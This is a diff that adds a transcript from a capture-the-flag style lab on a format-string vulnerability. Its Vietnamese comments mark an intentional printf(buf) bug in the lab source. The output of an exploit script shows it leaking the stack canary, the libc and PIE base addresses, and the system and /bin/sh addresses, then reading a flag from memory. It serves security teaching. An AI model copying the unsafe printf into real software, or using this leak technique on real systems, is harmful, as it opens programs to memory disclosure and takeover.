@@ -1,0 +1,46 @@
+# Transcript lab 7.1 - format string leak
+# Moi truong: Ubuntu 24.04.4, glibc 2.39, gcc 13.3.0, ASLR bat (randomize_va_space=2)
+# Chay: 2026-10-08T00:11:00Z UTC
+
+$ uname -a
+Linux ubuntu24 6.8.0-134-generic #134-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 26 18:43:11 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+
+$ bash build.sh
+src.c: In function ‘main’:
+src.c:30:16: warning: format not a string literal and no format arguments [-Wformat-security]
+   30 |         printf(buf);     // <--- LOI format string o day
+      |                ^~~
+[*] built: leak
+
+$ checksec (pwntools)
+[*] '/root/techlabs/pwn-p7/lab71/leak'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+    Debuginfo:  Yes
+RELRO Full | Canary True | NX True | PIE True
+
+$ python3 exploit.py   (ASLR bat, leak dong moi lan)
+[*] '/root/techlabs/pwn-p7/lab71/leak'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+    Debuginfo:  Yes
+[1] marker 0x41*8 xuat hien o offset = 8 (vi tri chuoi cua ta tren stack)
+[2] canary    = 0xbb44c71fbfc80c00  (ket thuc bang byte 00: True)
+    libc base = 0x7d55ef400000  (leak 0x7d55ef42a1ca - 0x2a1ca)
+    PIE  base = 0x6147b6d19000  (leak 0x6147b6d1a1c9 - main@0x6147b6d1a1c9)
+    => system @ 0x7d55ef458750 , str /bin/sh @ 0x7d55ef5cc42f
+[3] %s doc @ 0x6147b6d1d020  ->  b'FLAG{f0rmat_str1ng_arb1trary_r3ad}'
+
+[OK] leak offset=8, canary/libc/PIE deu dung, %s doc duoc secret.
